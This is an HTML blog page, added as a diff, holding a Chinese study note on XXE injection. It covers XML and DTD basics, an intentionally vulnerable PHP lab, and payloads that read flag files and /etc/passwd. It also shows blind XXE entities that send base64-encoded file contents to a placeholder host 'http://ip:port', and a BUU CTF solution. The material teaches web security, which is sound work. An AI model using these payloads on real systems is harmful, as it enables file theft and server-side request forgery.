@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>XXE漏洞的学习 | Seizer</title><meta name="keywords" content="学习笔记"><meta name="author" content="Seizer"><meta name="copyright" content="Seizer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XXE漏洞的学习XXE：XML External Entity 即外部实体，从安全角度理解成 XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。 XML基础知识XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常复杂的数据结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞的学习">
+<meta property="og:url" content="https://seizer-zyx.github.io/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Seizer">
+<meta property="og:description" content="XXE漏洞的学习XXE：XML External Entity 即外部实体，从安全角度理解成 XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。 XML基础知识XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常复杂的数据结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062110436.png">
+<meta property="article:published_time" content="2021-10-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-07T05:58:26.334Z">
+<meta property="article:author" content="Seizer">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/seizer-zyx/picgo/raw/master/cover-images/202112062110436.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://seizer-zyx.github.io/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XXE漏洞的学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-07 13:58:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/transparent.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Seizer</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">XXE漏洞的学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-10-25T16:00:00.000Z" title="undefined 2021-10-26 00:00:00">2021-10-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XXE漏洞的学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="XXE漏洞的学习"><a href="#XXE漏洞的学习" class="headerlink" title="XXE漏洞的学习"></a>XXE漏洞的学习</h1><p>XXE：<code>XML External Entity</code> 即外部实体，从安全角度理解成 XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。</p>
+<h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>XML是<code>可扩展标记语言</code>（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）的缩写，它是是一种数据表示格式，可以描述非常复杂的数据结构，常用于传输和存储数据。</p>
+<p><code>语法结构</code>与 <code>HTML </code>大致相同，<code>HTML</code> 旨在显示数据信息，而 <code>XML</code> 旨在传输数据信息。（说到传输数据自然而然肯定会想到<code>json</code>格式，相比<code>XML</code>，现在用的更多是<code>json</code>格式来传输数据）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>seizer<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>ggbond<span class="tag">&lt;/<span class="name">from</span>&gt;</span>xml</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上面代码中的第一行，定义XML的版本与编码。</p>
+<p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p>
+<p>同时，所有的XML元素都必须有关闭标签，这点不像HTML语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
+<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA 和 CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
+<p>网上的文章中对实体的种类个数各有不同，大致为以下几种：</p>
+<p>内部实体 外部实体 字符实体 命名实体 参数实体</p>
+<h2 id="文档类型定义：-DTD"><a href="#文档类型定义：-DTD" class="headerlink" title="文档类型定义： DTD"></a>文档类型定义： DTD</h2><p>XML的语言规范是由DTD（Document Type Definition）来控制，类似编程语言的语法，它定义了XML文档的合法构建模块，即声明了XML的内容格式规范。</p>
+<p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 dtd 文件。</p>
+<h3 id="内部引用"><a href="#内部引用" class="headerlink" title="内部引用"></a>内部引用</h3><p>格式：</p>
+<blockquote>
+<!ENTITY 实体名称 "实体的值">
+</blockquote>
+<p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  <span class="meta-keyword">chybeta</span>  <span class="meta-string">&quot;Hello World!&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </span><br><span class="line">    <span class="symbol">&amp;chybeta;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问该XML文档，&chybeta;会被解析为Hello World!并输出。</p>
+<h3 id="外部引用"><a href="#外部引用" class="headerlink" title="外部引用"></a>外部引用</h3><blockquote>
+<!ENTITY 实体名称 SYSTEM "URI">
+</blockquote>
+<p>通过引用定义在外部的DTD中的实体，我们称之为外部实体。 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c://123.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358016.png" alt="image-20211019222721226"></p>
+<h2 id="XML-注入"><a href="#XML-注入" class="headerlink" title="XML 注入"></a>XML 注入</h2><p>demo：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 注入前XML代码</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;用户输入位置&lt;/USER&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户输入一些恶意代码，比如<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>，原XML代码就变成了下面的样子：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 注入后XML代码</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;User1&lt;/USER&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;User2&lt;/USER&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于普通的<code>XML注入</code>，利用面比较狭窄，所及几乎永不i到，如果有的话也应该是逻辑漏洞，下面重点介绍<code>XXE</code>的利用！</p>
+<h1 id="XXE漏洞的利用"><a href="#XXE漏洞的利用" class="headerlink" title="XXE漏洞的利用"></a>XXE漏洞的利用</h1><p>实验环境：</p>
+<p>windows11 + phpStudy + apache + php</p>
+<p>PHP Version: 5.2.17</p>
+<p>libxml Version: 2.7.7</p>
+<h2 id="有回显读本地敏感文件（Normal-XXE）"><a href="#有回显读本地敏感文件（Normal-XXE）" class="headerlink" title="有回显读本地敏感文件（Normal XXE）"></a>有回显读本地敏感文件（Normal XXE）</h2><p>xxe.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$info</span> = simplexml_load_string(<span class="variable">$xmlfile</span>);</span><br><span class="line"><span class="comment">// $dom = new DOMDocument();</span></span><br><span class="line"><span class="comment">// $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="comment">// $info = simplexml_import_dom($dom);</span></span><br><span class="line">print_r((<span class="keyword">string</span>)<span class="variable">$info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Congratulations to you!</span><br></pre></td></tr></table></figure>
+
+<p>demo.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358017.png" alt="image-20211025212502713"></p>
+<p>如果 <code>flag.txt</code>中包含特殊符号，比如<code>&lt;&gt;&amp;&#39;</code>等，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XXE Congratulations to you!&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358018.png" alt="image-20211026135124382"></p>
+<p>可以看到当被读取文件中含有特殊符号时，返回了一堆错误，这个时候我们可以使用<code>CDATA</code>（还可以使用 <code>php://filter </code>进行 base64 编码进行读取）</p>
+<blockquote>
+<p>什么是CDATA：</p>
+<p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p>
+<p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p>
+</blockquote>
+<p>修改 demo.xml 为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;demo.dtd&quot;</span>&gt;</span> %dtd;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地添加: demo.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358019.png" alt="image-20211026140239559"></p>
+<p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p>
+<p>但是在真实情况下，服务器上的XML一般用于配置文件或者传输数据，而不是显示数据，因此在现实环境下利用这个漏洞就需要找到不依靠回显的方法。</p>
+<h2 id="无回显读取本地敏感文件（Blind-XXE）"><a href="#无回显读取本地敏感文件（Blind-XXE）" class="headerlink" title="无回显读取本地敏感文件（Blind XXE）"></a>无回显读取本地敏感文件（Blind XXE）</h2><h3 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h3><p>靶机文件：xxe_blind.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地 payload：demo.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/demo.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本地文件：demo.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在可访问的 <code>ip</code> 地址即<code>端口</code>上使用 <code>nc</code> 进行监听，从而形成攻击</p>
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358020.png" alt="img"></p>
+<h3 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h3><p>demo.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/xxe.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>xxe.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://ip:port/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
+<p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p>
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358021.png" alt="img"></p>
+<h1 id="BUU-XXE-COURSE-1"><a href="#BUU-XXE-COURSE-1" class="headerlink" title="BUU XXE COURSE 1"></a>BUU XXE COURSE 1</h1><p>进入页面后是一个 Login 登录页面，随便填试一下</p>
+<p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358022.png" alt="image-20211026142903435"></p>
+<p>发现 login.php ，并且发现了 xml 注入点</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>回显为<code>username</code>标签，为有回显XXE</p>
+<p>构造payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注入后获得 flag</p>
